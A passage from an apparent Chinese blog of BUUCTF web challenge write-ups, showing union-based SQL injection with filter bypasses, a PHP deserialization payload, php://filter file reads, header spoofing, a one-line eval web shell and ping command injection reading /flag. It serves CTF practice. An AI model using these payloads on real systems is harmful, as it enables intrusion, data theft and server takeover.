<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8337ba06-02fe-47b4-8563-e341d08b19fe&#125;</span><br></pre></td></tr></table></figure>

<h4 id="15、BabySQL"><a href="#15、BabySQL" class="headerlink" title="15、BabySQL"></a>15、BabySQL</h4><p>常规注入：<code>/check.php?username=admin&amp;password=1&#39; union select 1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ed301d3e-a195-4d86-abb1-871db2c6eb2c" alt="image"></p>
<p>根据报错信息，猜测union 、select可能被过滤了，试一下双写绕过<br><code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5d921e6b-5869-498e-a14a-4aa76ccf65b2" alt="image"></p>
<p>URL编码试一下，然后试列数<br>payload：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,3%23</code>，登录成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4eaa532-463d-46e8-a088-2e411973852d" alt="image"></p>
<p>爆数据库:<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code>，猜测flag在ctf里</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1632ca5e-09f0-4d3e-b47e-b344f49646d8" alt="image"></p>
<p>爆表：<code>/check.php?username=admin&amp;password=1&#39; ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=&quot;ctf&quot; %23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92267bcd-7eb4-4b5d-a41b-88ab75362b1e" alt="image"></p>
<p>查字段名：<code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=&quot;Flag&quot;%23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4876a461-70fe-43cf-b0c5-69b435606532" alt="image"></p>
<p><code>/check.php?username=admin&amp;password=pwd &#39; ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6b20f762-65b5-42c8-8cad-00ac5910ed6e" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;009a3737-39ae-44ff-8bfb-45287b1e2093&#125;</span><br></pre></td></tr></table></figure>

<h4 id="16、PHP"><a href="#16、PHP" class="headerlink" title="16、PHP"></a>16、PHP</h4><p>题目提示了备份网站</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/18c18833-30dc-498d-acf7-4095c042798c" alt="image"></p>
<p>使用目录扫描工具 dirsearch</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/14048052.html">目录扫描工具 dirsearch 使用详解 - FreeK0x00 - 博客园 (cnblogs.com)</a></p>
<p>可以直接到github上下载压缩包，解压后，进入目录运行cmd</p>
<p>首先安装dirsearch：<code>python setup.py install</code></p>
<p>如果报错，可能是因为pip版本太低，更新pip：<code>python -m pip install --upgrade pip</code></p>
<p>运行，开始扫描：<code>py -3.9 dirsearch.py -u http://15349308-86d1-4f57-8e2c-50b34e5d48eb.node4.buuoj.cn:81/ -e php</code></p>
<p>响应成功的如下图所示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fcc5c5f4-5fbe-4929-9938-3db7ff70dee8" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1908e07e-39aa-4685-9079-71f36405ed17" alt="image"></p>
<p>访问<a target="_blank" rel="noopener" href="http://www.zip文件,下载了一个压缩包/">www.zip文件，下载了一个压缩包</a></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c166170d-069f-4d99-acb4-e75a2c6ac3fc" alt="image"></p>
<p>解压得到一系列文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9be93ca0-b413-4787-8b29-3115eec2be45" alt="image"></p>
<p>查看index.php文件，发现包含class.php文件，采用get传参select，还有个php反序列化函数unserialize()</p>
<p>所以页面可以传进一个参数<code>select</code>然后把它反序列化，反序列化的过程中会用到class.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/917331c7-3a19-4c6a-b5b8-2d08ca263360" alt="image"></p>
<p>查看class.php文件，有输出flag的条件</p>
<p>要调用到__destruct（）并且<code>password=100,username=admin</code>才能<code>echo $flag</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ae9dc2e9-205f-41ab-916a-2d1f257c26ed" alt="image"></p>
<p>魔法函数</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">在反序列化脚本结束时会自动调用它，它是unserialize()结束的魔术方法（魔法函数）</span><br><span class="line"></span><br><span class="line">魔法函数</span><br><span class="line">通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</span><br><span class="line">__construct 当一个对象创建时自动调用</span><br><span class="line">__destruct 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</span><br><span class="line">__sleep() 使**用serialize()函数时触发</span><br><span class="line">__wakeup 使用unserialse()**函数时会自动调用</span><br><span class="line">__toString 当一个对象被当作一个字符串被调用。</span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() 用于从不可访问的属性读取数据//调用私有属性时使用</span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>

<p>构造序列化，php代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &quot;yesyesyes&quot;;</span><br><span class="line">    private $password = &quot;nonono&quot;;</span><br><span class="line">    public function __construct($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username=$username;</span><br><span class="line">        $this-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(@admin,100);</span><br><span class="line">//var_dump($a);</span><br><span class="line">//echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b.&quot;&lt;br&gt;&quot;;//输出序列化</span><br><span class="line">echo urlencode($b);//输出url编码后的序列化</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>序列化后是这样的：</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92a4085c-3183-425c-90bf-5175c5f4b940" alt="image"></p>
<p>调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把Name后面的2改为3或以上即可</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>然后url识别不了”，改为%22</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22Nameusername%22;s:5:%22admin%22;s:14:%22Namepassword%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>因为成员（属性）是private，所以要在类名和成员名前加%00这个url编码是空的意思。因为生产序列化时不会把这个空也输出。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>


<p>完整payload：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6916ddd3-236d-4ee7-9d17-962c0187f537" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1e6c9083-a44b-4c83-9a9c-f865d6230e68&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/09/Buuctf%20Web%EF%BC%8813-16%EF%BC%89/" data-id="cll5bk8gt0000e4vfgrzth6zo" data-title="Buuctf Web（13-16）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（9-12）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-08T13:24:46.000Z" itemprop="datePublished">2023-08-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/">Buuctf Web（9-12）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（9-12）"><a href="#Buuctf-Web（9-12）" class="headerlink" title="Buuctf Web（9-12）"></a>Buuctf Web（9-12）</h3><h4 id="9、Secret-File"><a href="#9、Secret-File" class="headerlink" title="9、Secret File"></a>9、Secret File</h4><p>查看源代码，有一个Archive_room.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8f92bc8c-c00d-49e5-b321-488e99af3728" alt="image"></p>
<p>查看该文件，有一个按钮</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2f52ac5a-eb0a-4597-9639-8eb419803978" alt="image"></p>
<p>点击按钮，没看到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/28a170be-68bb-4f90-9875-e7bf863111a0" alt="image"></p>
<p>从按钮处抓包，看到有一个secr3t.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5d9d3bb9-5590-4daf-8431-6b327283fc89" alt="image"></p>
<p>查看该文件，flag在flag.php里</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/970159db-f8ad-41b9-9a37-5fc0c5d48a0e" alt="image"></p>
<p>查看该文件，还是没看到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ece77017-09c0-4f2e-9f32-8ec19c9a01af" alt="image"></p>
<p>想到了PHP的封装协议，利用了filter伪协议，该协议刚好就能够查看文件包含的漏洞，所以当我们利用该协议查看flag.php时，会将它的源代码爆出来，但是因为base64的加密原因，所以我们还需要进行一次base64解密</p>
<p>构造payload: <code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/164dbeeb-bc18-4496-86b6-5c9324f74dfb" alt="image"></p>
<p>看到一串base64编码，解码后得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/70bf11c6-f0cc-4c1d-912a-73bbfac52ebf" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;657993f7-ec4c-4ccd-a411-1fbca834a5b5&#125;</span><br></pre></td></tr></table></figure>

<h4 id="10、LoveSQL"><a href="#10、LoveSQL" class="headerlink" title="10、LoveSQL"></a>10、LoveSQL</h4><p>尝试万能密码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c41017b4-189d-4bb3-9734-cbe9b67f1176" alt="image"></p>
<p>有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/28f501c1-3599-4279-b421-f10026b15978" alt="image"></p>
<p>尝试联合查询，查到3的时候回显正常</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c732357b-32f9-4208-a8e8-1238c2ddc296" alt="image"></p>
<p>爆数据库password&#x3D;:<code>1&#39; union select 1,2,database()#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9e319507-1e47-4c7d-b1c3-513dfe8567dc" alt="image"></p>
<p>爆出数据库名为geek</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ee2e800-9f8e-4e3c-84cd-74cc042130f7" alt="image"></p>
<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/46fefaef-3e5b-4e25-879b-fe8d90e6a190" alt="image"></p>
<p>爆出表名为geekuser</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f86dda2c-490c-4565-9987-7debf9b563fc" alt="image"></p>
<p>爆表名password&#x3D;<code>1&#39; union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/91e3ddbc-4172-46a3-bd4a-8475672d22ae" alt="image"></p>
<p>爆出表名为l0ve1ysq1</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/48fad51e-7c1d-46c2-a62f-70096f1911b0" alt="image"></p>
<p>爆列名password&#x3D;<code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39; #</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d75cf913-a8ff-42bc-a889-2520f7034e8a" alt="image"></p>
<p>id,username,password</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d4322e73-777f-41f7-a80d-216f16b92262" alt="image"></p>
<p>爆数据：<code>/check.php?username=1&amp;password=1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8f190d3d-18db-46dd-a153-14c2629ab419" alt="image"></p>
<p>查看源代码，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/847ee93b-2338-46f3-bd64-75dd2af16945" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7904eee7-45b3-4f8b-8eac-ecab975dac71&#125;</span><br></pre></td></tr></table></figure>

<h4 id="11、Http"><a href="#11、Http" class="headerlink" title="11、Http"></a>11、Http</h4><p>查看页面源代码，发现有个Secret.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/fc1e582e-da71-41e3-ae68-398440843c32" alt="image"></p>
<p>查看该文件，有一个网址</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c8fae7de-4638-4717-894c-194b9ff5d21d" alt="image"></p>
<p>提示：It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://www.sycsecret.com’,就是说这个页面得来自https//www.Sycsecret.com%EF%BC%8C%E6%B7%BB%E5%8A%A0referer%E5%8D%B3%E5%8F%AF">https://www.Sycsecret.com’，就是说这个页面得来自https://www.Sycsecret.com，添加referer即可</a></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer头用于告诉web服务器，用户是从哪个页面找过来的</span><br></pre></td></tr></table></figure>

<p>添加<code>Referer:https://www.Sycsecret.com</code>，send，提示Please use “Syclover” browser：请使用“Syclover”浏览器</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/06269527-d670-4189-8c9f-dc64374f0ec7" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent头用于告诉web服务器用户使用的浏览器和操作系统信息</span><br></pre></td></tr></table></figure>

<p>添加<code>User-Agent:Syclover</code>，send，提示No!!! you can only read this locally!!!：不! !您只能在本地阅读!!</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b1b7a270-fb3d-4019-b4e7-6e174ce633a5" alt="image"></p>
<p>添加<code>X-Forwarded-For:127.0.0.1</code>，send，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d6d19f27-7902-4f41-b3d7-741661d1f670" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;43a4b431-f334-44b4-bcb3-aadf626871ac&#125;</span><br></pre></td></tr></table></figure>

<h4 id="12、Knife"><a href="#12、Knife" class="headerlink" title="12、Knife"></a>12、Knife</h4><p>使用蚁剑，安装教程<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367151320">渗透工具：蚁剑教学 （安装+入门） - 知乎 (zhihu.com)</a></p>
<p>构造payload：<code>/?&lt;?php eval($_POST[&quot;Syc&quot;]);?&gt;</code></p>
<p>打开蚁剑添加数据</p>
<p>URL地址为：<a target="_blank" rel="noopener" href="http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php">http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php</a></p>
<p>密码为：Syc</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/571e5c69-fd79-42ac-b19c-763a2829d8cd" alt="image"></p>
<p>测试连接，连接成功，再点击添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f59bd98d-4a3b-49f2-8a9c-1dcc3501da10" alt="image"></p>
<p>右键单击，选择文件管理</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57e65112-788b-4318-a13f-a71402bff8fa" alt="image"></p>
<p>查看根目录，发现有个flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/10606a37-f6d4-4239-8dd6-d593206d2c52" alt="image"></p>
<p>双击查看，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/66b20406-1aeb-403e-9833-8ee8bbb16270" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1248bbb7-c099-4589-a699-63d87c2ec2d3&#125;</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/08/Buuctf%20Web%EF%BC%889-12%EF%BC%89/" data-id="cll2ftaqf00004gvf6qb62b6u" data-title="Buuctf Web（9-12）" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Buuctf Web（1-8）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2023-08-07T12:38:17.000Z" itemprop="datePublished">2023-08-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/">Buuctf Web（1-8）</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="Buuctf-Web（1-8）"><a href="#Buuctf-Web（1-8）" class="headerlink" title="Buuctf Web（1-8）"></a>Buuctf Web（1-8）</h3><h4 id="1、EasySQL"><a href="#1、EasySQL" class="headerlink" title="1、EasySQL"></a>1、EasySQL</h4><p>万能密码</p>
<p>1’or’1’&#x3D;’1</p>
<p>sql语句中#是注释符</p>
<p>select * from table_name where username&#x3D;’1’ or 1&#x3D;1 # ‘ and password&#x3D;’xxxxxx’ ;</p>
<p>相当于</p>
<p>select * from table_name where username&#x3D;’1’ or 1&#x3D;1</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3a60fa05-3af6-4713-a7e9-5fa7b92293bf" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/296048b4-9808-4596-821e-a3ff1dc0fd1e" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;46247fc5-8cd1-4f68-9601-63d1ccd4d7dc&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、Havefun"><a href="#2、Havefun" class="headerlink" title="2、Havefun"></a>2、Havefun</h4><p>查看源码，看到一串被注释的php代码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/baea5f74-f9fe-4944-9b59-6cecb6a75602" alt="image"> </p>
<p>有一个cat变量，通过get方式传参，如果cat&#x3D;dog，输出flag</p>
<p>构造payload：&#x2F;?cat&#x3D;dog</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/44a8bec8-51b5-48ad-a28c-a17e0a0f4a6d" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d6a6ed35-29e7-41db-9a46-170dcb0f9128&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3、WarmUp"><a href="#3、WarmUp" class="headerlink" title="3、WarmUp"></a>3、WarmUp</h4><p>查看源码，发现一个注释掉的source.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9f419731-7f5b-4275-b4e6-5e32b82f9524" alt="image"></p>
<p>访问php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3f0dc177-7b92-4ba2-b8cd-84240fad2fec" alt="image"> </p>
<p>文件中有一个hint.php</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/42b87e8b-e8e6-4ef1-a95d-6d77fa4d0c2d" alt="image"> </p>
<p>查看该文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6e56260d-bf15-4c98-8d2a-92c4e0e5ccf0" alt="image"> </p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0a3b8cda-b707-4543-92f1-29d9ac5cb219" alt="image"> </p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/67c17320-e565-4ca3-9fae-23fd2ae47742" alt="image"> </p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d99f238-8882-4915-8ce8-2ac62ddbecf3" alt="image"> </p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;65f5d7a9-2b2d-49b0-accf-52264323d465&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4、Include"><a href="#4、Include" class="headerlink" title="4、Include"></a>4、Include</h4><p>查看页面源代码，发现有个flag.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/92cdcd45-b0de-4fcf-9957-58911c93bdf4" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e67bbbf4-6a41-4099-913e-6b726bc22d3a" alt="image"></p>
<p>查看页面源代码发现啥也看不见，猜测包含文件漏洞</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">重要的知识点——PHP封装协议：</span><br><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class="line">php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字filter，可以很容易想到这个协议可以用来过滤一些东西；使用不同的参数可以达到不同的目的和效果：</span><br><span class="line">resource=&lt;要过滤的数据流&gt; 指定了你要筛选过滤的数据流。 必选</span><br><span class="line">read=&lt;读链的筛选列表&gt;可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选</span><br><span class="line">write=&lt;写链的筛选列表&gt; 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选</span><br><span class="line">&lt;；两个链的筛选列表&gt; 任何没有以 read= 或write=作前缀 的筛选器列表会视情况应用于读或写链。</span><br><span class="line">php://filter与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，阻止其不执行。从而导致任意文件读取。</span><br><span class="line">read=convert.base64-encode，用base64编码输出，不然会直接当做php代码执行，看不到源代码内容。</span><br></pre></td></tr></table></figure>

<p>php:&#x2F;&#x2F;filter协议，用base64编码的方式来读文件flag.php；这时页面会显示出源文件flag.php经过base64编码后的内容，然后经过base64解码就可以看到flag</p>
<p>payload: <code>/?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>得到base64编码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3d9b0b25-dc61-4525-bd9f-e5b9b47912ea" alt="image"></p>
<p>解码得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/1d3da52f-a110-4e54-b8c8-515c3af99420" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9c483c1a-9c62-41d3-abd8-51e64d50357f&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5、Exec"><a href="#5、Exec" class="headerlink" title="5、Exec"></a>5、Exec</h4><p>Linux ping 命令用于检测主机。执行 ping 指令会使用 ICMP 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常</p>
<p>ls（英文全拼：list files）：用于显示指定工作目录下的内容（列出目前工作目录所含之文件及子目录)</p>
<p>cat（英文全拼：concatenate）：用于连接文件并打印到标准输出设备上</p>
<p>首先查看此文件的目录：127.0.0.1|ls</p>
<p>点击ping后发现有个index.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ed432b5-3a25-47e5-a5d8-fa4e3948b9ba" alt="image"></p>
<p>再查看上级目录：127.0.0.1|ls &#x2F;</p>
<p>点击ping后可以看到一个flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0d1134f8-a13d-495a-aee7-8cf77a4b70df" alt="image"></p>
<p>查看flag：127.0.0.1|cat &#x2F;flag</p>
<p>得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/82ff4a13-d4da-43e8-bc7e-9b7cf5acf0f9" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4504f6f2-191b-410b-b40d-18b4e403a271&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6、Ping-Ping-Ping"><a href="#6、Ping-Ping-Ping" class="headerlink" title="6、Ping Ping Ping"></a>6、Ping Ping Ping</h4><p>这一题与上一题Exec类似，首先访问本地地址，发现有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/22516845-102d-4d83-b285-1b77da5f6ece" alt="image"></p>
<p>查看此文件的目录，发现有两个文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/7d100ccc-5cf4-4e39-b61e-5cf2b2dc48f6" alt="image"></p>
<p>查看flag.php文件</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/4a1777df-77fb-4867-a0c5-6af4f22783c8" alt="image"></p>
<p>它说空格被过滤了</p>
<p>命令中空格被过滤的解决方法：</p>
